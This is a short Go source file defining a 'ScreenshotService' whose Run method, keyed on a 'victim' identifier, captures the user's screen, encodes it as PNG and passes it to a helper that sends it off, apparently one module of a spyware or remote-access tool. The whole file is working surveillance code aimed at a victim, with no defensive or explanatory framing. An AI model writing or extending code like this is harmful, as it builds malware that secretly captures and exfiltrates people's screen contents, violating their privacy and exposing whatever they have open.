package services

import (
	"bytes"
	"fmt"
	"github.com/vova616/screenshot"
	"image/png"
	"main/utils"
)

type ScreenshotService struct {
}

func (s *ScreenshotService) Run(victim string) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		utils.HandleError(err.Error(), victim)
		fmt.Println(err)
	} else {
		buf := new(bytes.Buffer)
		err := png.Encode(buf, img)
		if err != nil {
			utils.HandleError(err.Error(), victim)
			fmt.Println(err)
			return
		}
		send := buf.Bytes()
		_, err = utils.HandleScreenshotRequest(send, victim)
		if err != nil {
			utils.HandleError(err.Error(), victim)
			fmt.Println("Error sending the request")
		}
	}

}
